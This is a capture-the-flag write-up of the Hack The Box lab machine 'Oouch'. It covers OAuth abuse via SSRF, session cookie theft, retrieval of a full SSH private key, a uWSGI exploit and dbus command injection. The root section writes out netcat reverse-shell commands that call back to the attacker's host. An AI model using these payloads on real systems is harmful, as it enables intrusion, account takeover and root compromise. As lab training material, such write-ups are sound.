# Oouch

Oouch in my opinion is one of the best ever hack the box machines that i have played and completed, it is also said to be one of the most realistic machines on hack the box. Most of the user partion being a very interesting web exploitation techqnique. And root using `uwsgi` and `dbus` to gain a root shell

Oouch consisted of many things so i will do a brief summary of each step below:

## Summary

* Finding the directory `/oauth`
* Getting a token code for the user
* Ssrf in the `contact` page to link the account `qtc`
* Once logged in we make an application
* Getting the sessionid of qtc and then using xxs and ssrf with the application
* Getting an access code
* Getting ssh keys of `qtc`
* Got user.txt
* Finding the docker ip addresses
* Logging into docker
* Exploiting the `uwsgi` service as `www-data`
* Exploiting dbus to get a root shell
* Got root.txt

## User

### Nmap

```bash
➜  oouch nmap -sC -sV -o nmap 10.10.10.177
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 04:27 EDT
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for oouch.htb (10.10.10.177)
Host is up (0.045s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://oouch.htb:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.36 seconds
```

Nmap returned 4 ports being open which are all needed. We see that port 5000 is the one open on the http service but we will take a look at that later. First we head over to port 21 on `ftp` to see if we get any interesting files.

### Ftp

```bash
➜  oouch ftp oouch.htb
Connected to oouch.htb.
220 qtc's development server
Name (oouch.htb:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (1018.1183 kB/s)
ftp> exit
221 Goodbye.
```

After downloading the file to our machine we take a look at it.

```bash
➜  oouch cat project.txt 
Flask -> Consumer
Django -> Authorization Server
```

The note doesnt seem too interesting at first but we later find out that the `Consumer` and `Authorization` are subdomains of the oouch.htb domain and they are each running a different framework.

We move on from `ftp` and head over to the website to take a look there.

### Port 8000

After heading over to port 8000 in the web browser we are greeted with a 400 error so we move on to the next port\(although we will come back to this later\).

![img-1](https://i.ibb.co/JqLLXc3/oouch-port-8000.png)

### Port 5000

![img-2](https://i.ibb.co/kHtxtdh/oouch-port-5000-after-login.png)

After going to `http://oouch.htb:5000` we get a login page with a nav bar that also has a register option.

I register with the credentials:

* username: field
* email field@gmail.com
* password: 123

Theese can be anything that you like as long as you remember them.

We then go back to the login section and relogin again with the account that we just made.

After looking at all the pages we dont notice anything interesting apart from the `/contact` page that we could get a possible xss or ssrf exploit on that but we will leave that for now.

### Gobuster

```bash
➜  oouch gobuster dir -u http://oouch.htb:5000/ -o dirs_5000 -w /usr/share/dirb/wordlists/big.txt       
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://oouch.htb:5000/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/31 04:38:19 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
```

After running a directory scan with gobuster we notice the directory `oauth` which we take a look at straight away.

![sign-up-port-8000](https://i.ibb.co/ZfcbxMT/sign-up-on-port-8000.png)

After visiting this we can see that it seems to be a sort of link portal to the other domains.

We can see it wants us to visit `consumer.oouch.htb` and when clicking on the top link we get a redirect to `authorization.oouch.htb`, Now the ftp note makes sense,

the `consumer.oouch.htb` subdomain is running `Flask` and the `authorization.oouch.htb` subdomain is running the `Django` framework.

We add both of theese to our `/etc/hosts` file and click on both the links to enumerate further.

### Exploiting the oauth

On arrival we see that we have a login page which is running on port `8000`

![img-3](https://i.ibb.co/ygKs2MQ/oouch-authorization-8000-login.png)

We will need to register another account so we head to `/signup` and fill out the details.

> note i made mine like field\_auth, you may want to do this as the amount of accounts we have gets confusing.

![img-4](https://i.ibb.co/Pc3j9Df/auth-signup-8000.png)

After we register for an account we head back over to `http://consumer.oouch.htb:5000/oauth/connect` and have our burp intercept proxy at the ready.

We intercept the request straight away when you visit that page in the browser.

We then forward this request and we get something new.

```bash
GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=Stunn36IKtj5gIp3ZcBrYaztEOiVXjVp2ouK9mmA8edRo9G5oteXl9VnYf19oH4v; sessionid=frddxq8dd6zinyh9o8rqtole7tfv59a7
Upgrade-Insecure-Requests: 1
```

We we have the parameter `client_id`, we forward this request aswell and we see a popup on the web browser asking us to authorize.

We click on that and then forward the request once again.

We now have our token code!

It should look something like this at the end of all the forwarding.

```bash
GET /oauth/connect/token?code=4eS9I4EAVH7nWrSRF9HKKpILYm9FPn HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Connection: close
Cookie: session=.eJydj0FuQjEMRK8SZY0qx_lOYk7BvkLIiR1ApVD9fFaIuzdSb9DVyPKM_eblT_0m42LD7z9f3m1T_LeNIWfzO3-4mQxzt8fZXe9uezhpbS7ddrkO9zM9H_743v0zd9zN56uNi99v69PmdFW_9407k0rApS8hK3PtyJBAkZGEFrHQskENJLVAssIZ1CwvXIpIy8FUEy4YIGIsrapVUssxTwRNDBlKMYraEuk8RDWkINBSpwUxIUz8NtZ-2h5fdp88zAKRMubQQ40NqWORZtAtGCUF5Ri0EM_cc9j6VwL9-xcCfWhi.XyPeeg.rnY1N7mt6Q6zQDDeKn0qSL1XLgQ
Upgrade-Insecure-Requests: 1
```

### SSRF in contact page.

Now we have our token we can try and abuse this to link our account to the admin account on the system.

There is an ssrf in the contact page on the `oouch.htb:5000` page.

We paste our url with the token code into it and wait.

`http://consumer.oouch.htb:5000/oauth/connect/token?code=vekuSAHQKZFMSKVocqOUvxzsZPgQF8`

Our url that we paste into it should like like this except with your own token.

![img-5](https://i.ibb.co/Ln2qBX6/contact-page.png)

We wait about 10 seconds maybe a little longer for the request to get processed.

Then we go back to `http://consumer.oouch.htb:5000/oauth/login` and we should see another authorize button!

![img-6](https://i.ibb.co/6rnR5rh/authorize-button.png)

We click authorize and it logs us in as `qtc`!

What we essentially did here was connect our own account with qtc,s account. You will see in the profile section that our own user is the one connected.

![img-7](https://i.ibb.co/tJ6Mmsn/qtc-logg-in.png)

We then go ahead to the documents tab and we find some details that we will need.

We see A file called `dev_access.txt` with the details `develop:supermegasecureklarabubu123! -> Allows application registration.`.

![img-8](https://i.ibb.co/8K29BMk/qtc-documents.png)

This will be the credentials for the application that we will register later on.

There is also a mention about ssh keys on `todo.txt` so this might be a hint that we need to get an ssh key in order to login and read the user flag.

With this in mind we will go and try find this `application` feature that he mentions.

### Creating the application

We run a recursive directory search on `http://authorization.oouch.htb:8000/` and find `/oauth/applications/register`

Visiting this we find a login poppup page that asks for credentials, we use `develop:supermegasecureklarabubu123!` that we found earlier.

![img-9](https://i.ibb.co/dfLX6ZX/entering-creds-for-the-app.png)

After loggging in we are greeted by a page that allows us to create a new application.

It automatically gives us the `client id` and `client secret` so we dont have to worry about those.

I fill out the following details:

![img-10](https://i.ibb.co/ykNZJ3R/app-register.png)

Make sure to add your own ip as the `Redirect Uris`

We note down all the details and put together our own url from which we will try to trigger a connection to our box.

IT ends up being like this:

```bash
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=7QQhqqzMpDxUgOyQvKhf1mT97MZjReuBFejHdQUN&redirect_uri=http://10.10.14.2:4444&grant_type=authorization_code
&client_secret=sJ293VS4FasXqzB92gekNeIFR9ncGYCDadO38geM1hBvaNvay26J9Wsl7is03s8No2Sc1jhTYbzQi4Y6hWdaLBdCdDmWmnyPY4CCSEdorob5NYPDWhGzHGf9IVMmCQP2
```

We setup a listener and and visit this url in the search bar.

We get a connecion back on our listener.

![img-11](https://i.ibb.co/Bqf9spM/listener-to-prove-connection.png)

Now we will try to get the cookies.

We paste this url into the ssrf section on the contact page like before and reset our listener.

We now got a connection on our listener showing us the `sessionid`!

![img-12](https://i.ibb.co/m6Wy08T/listener-to-steal-cookie.png)

We then use a cookie editor to change the `sessionid` to the value that we just got then refresh the page and now we are logged in as `qtc`.

![img-13](https://i.ibb.co/prbLXNV/logon-details-after-cookie.png)

### POST request to get ssh keys

We are nearly at user dont worry just a few more steps to go.

Our main goal at this stage is to try and get access to the api that was mentioned earlier in the docs.

We are going to make a `POST` request to `http://authorization.oouch.htb:8000/oauth/token/` using our `client_id`.

```bash
curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-Type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=7ZLCaJIn9NzEQ081RCpkk6rLwc7aJmYZGDmfvhsn&client_secret=xSxBgeE6uzDfT2cx4vnHDIygiLlwyI65aMYC6pzR77HaNSi7GhhLZmoRsKZJQ3vHOcRI7VeO2wVnWd56AhucNeBL1KgOLGdbRKy5B5dgxvWIbFWrUjAJS3oDYJ3EGqdn" -L -s
```

This should give us the response:

```bash
{"access_token": "xxxxxxxxxxxxxxxx", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}#
```

We will use this access token to get our ssh keys.

We make one final request to our browser with the url `http://authorization.oouch.htb:8000/api/get_ssh/?access_token=LpLKz5mxCzy8mxCLPnbzhtseeXyeEK`

And we get the ssh key!

We modify it to make it the correct format and this is our final result:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### User.txt

![img-12](https://i.ibb.co/wMnzFfL/ssh-user.png)

We the login with the key and read the user flag.

## Root

### Logining in to docker.

Running `ip a` gives us the following interesting results.

```bash
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:b7:cb:83:9e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:81:0a:5b:6d brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:81ff:fe0a:5b6d/64 scope link 
       valid_lft forever preferred_lft forever
```

We can see that the networks are runnin on docker on `172.17` or `172.18`.

We trial and error connectin to all of them and we get errors like so:

```bash
qtc@oouch:~$ ssh -i .ssh/id_rsa qtc@172.17.0.10
ssh: connect to host 172.17.0.10 port 22: No route to host
```

But one finally works for me it was the `172.18.0.2`

```bash
qtc@aeb4525789d8:~$ cd /
qtc@aeb4525789d8:/$ ls
bin  boot  code  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
qtc@aeb4525789d8:/$ cd code
qtc@aeb4525789d8:/code$ ls -la
total 52
drwxr-xr-x 4 root root 4096 Feb 11 17:34 .
drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..
-rw-r--r-- 1 root root 1072 Feb 11 17:34 Dockerfile
-r-------- 1 root root  568 Feb 11 17:34 authorized_keys
-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
-r-------- 1 root root 2602 Feb 11 17:34 key
drwxr-xr-x 4 root root 4096 Feb 11 17:34 migrations
-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
-rw-rw-rw- 1 root root    0 Jul 31 10:43 urls.txt
-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
```

we find an interesting file in /code/oouch called routes.py

```bash
qtc@aeb4525789d8:/code/oouch$ cat routes.py | grep dbus
import dbus
            bus = dbus.SystemBus()
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
```

We see that it is using the dbus interface and we try a few commands but none work as we are not privelaged enough to run them.

we see that uwsgi.ini is running as www-data when we run `ps -aux` so we can take a further look at this.

we check the version number by running

```bash
qtc@aeb4525789d8:/code/oouch$ uwsgi --version
2.0.17.1
```

We search for exploits of this verison and we come accross this exploit on github

[https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

We change line 18-19

```python
if sys.version_info[0] == 3: import bytes
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
```

and replace that with:

```python
s = bytes.fromhex(s)
```

We cannot build our exploit in docker so we head back to our ssh as qtc and upload the files there using wget from our local machine.

We then transfer the exploit and `nc` as we will want to get a connection back on our shell via `scp`.

```bash
qtc@oouch:/tmp$ scp -i /home/qtc/.ssh/id_rsa exploit.py qtc@172.18.0.2:/tmp
exploit.py                                                                                               100% 3658     8.8MB/s   00:00    
qtc@oouch:/tmp$ scp -i /home/qtc/.ssh/id_rsa /bin/nc qtc@172.18.0.2:/tmp
nc
```

Make sure to chmod +x them before transferring otherwise it wont work.

Now that we have everything we need we will run the command.

```bash
qtc@aeb4525789d8:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "/tmp/nc -e /bin/bash 172.18.0.1 1234"
[*]Sending payload.
```

Now open up another ssh session as qtc and start the listener and we get a connection back in a few seconds.

```bash
qtc@oouch:/tmp$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 40378
whoami
www-data
```

Now we will go ahead and exploit the `dbus` service.

```bash
www-data@aeb4525789d8:/code$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.xx.xx 1234 >/tmp/.0;"
<| /bin/bash -i 2>&1 | nc 10.10.14.2 1234 >/tmp/.0;"
method return time=1596193829.553087 sender=:1.1 -> destination=:1.335 serial=3 reply_serial=2
   string "Carried out :D"
www-data@aeb4525789d8:/code$
```

Now we wait a few moments for the dbus service to send and we should get a connection on our listener

```bash
➜  ~ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.177] 56788
bash: cannot set terminal process group (2551): Inappropriate ioctl for device
bash: no job control in this shell
root@oouch:/root# wc root.txt
wc root.txt
 1  1 33 root.txt
root@oouch:/root# whoami && hostname
whoami && hostname
root
oouch
root@oouch:/root#
```

Thanks so much for reading this hope that you enjoyed!

